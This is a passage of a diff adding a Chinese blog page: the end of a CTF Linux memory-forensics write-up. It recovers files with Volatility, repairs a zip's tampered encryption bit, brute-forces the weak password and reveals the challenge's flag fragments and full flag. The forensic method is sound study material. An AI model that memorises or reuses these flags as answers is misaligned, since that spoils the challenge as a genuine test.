+            data-src="https://tuchuang.huamang.xyz/img/image-20221031122455645.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221031122455645.png, https://tuchuang.huamang.xyz/img/image-20221031122455645.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221031122455645.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221031122455645.png">
+    </a></p>
+<p>就可以使用插件linux_recover_filesystem来跑出文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">python vol.py -f /tmp/1.mem  --profile=LinuxUbuntu_5_4_0-84-generic_profilex64 linux_recover_filesystem -D /tmp/ctf
+</code></pre></td></tr></table>
+</div>
+</div><p>这里的压缩包，打开发现是错误的</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221031122554090.png" title="image-20221031122554090" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221031122554090.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221031122554090.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221031122554090.png, https://tuchuang.huamang.xyz/img/image-20221031122554090.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221031122554090.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221031122554090.png">
+    </a></p>
+<p>010打开分析了一下猜测是加密位被改了，这里加密位改成09，然后发现压缩包正常，但是要密码</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221031122609008.png" title="image-20221031122609008" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221031122609008.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221031122609008.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221031122609008.png, https://tuchuang.huamang.xyz/img/image-20221031122609008.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221031122609008.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221031122609008.png">
+    </a></p>
+<p>爆破了一下，密码就是123456</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221031122621898.png" title="image-20221031122621898" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221031122621898.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221031122621898.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221031122621898.png, https://tuchuang.huamang.xyz/img/image-20221031122621898.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221031122621898.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221031122621898.png">
+    </a></p>
+<p>拿到flag2 <code>_y0u_Ar3_tHe_LIn</code></p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221031122632354.png" title="image-20221031122632354" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221031122632354.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221031122632354.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221031122632354.png, https://tuchuang.huamang.xyz/img/image-20221031122632354.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221031122632354.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221031122632354.png">
+    </a></p>
+<p>三个拼起来就是flag了但是交上去不对，看描述好像flag3还有点出入，又去autopsy搜了一下，果然有不一样的，这个交上去才是对的</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221031122642604.png" title="image-20221031122642604" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221031122642604.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221031122642604.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221031122642604.png, https://tuchuang.huamang.xyz/img/image-20221031122642604.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221031122642604.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221031122642604.png">
+    </a></p>
+<p>flag{890topico_y0u_Ar3_tHe_LInUx_forEnsIcS_MASTER}</p>
+</div>
+
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2022-10-31</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/rome/" class="prev" rel="prev" title="[Java安全] ROME链分析"><i class="fas fa-angle-left fa-fw"></i>[Java安全] ROME链分析</a></div>
+</div>
+</article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">2022</div><div class="footer-line"><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer">Huamang</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+                    <span class="icp"><a href="https://beian.miit.gov.cn/" target="_blank">赣ICP备2021001334号</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.0/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.11.0/dist/algoliasearch.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/topbar@1.0.1/topbar.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@sliphua/pjax@2.4.0/dist/pjax.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
+
+<div class="pjax-assets"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.zh-cn","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js"></script></div>
+</body>
+
+</html>
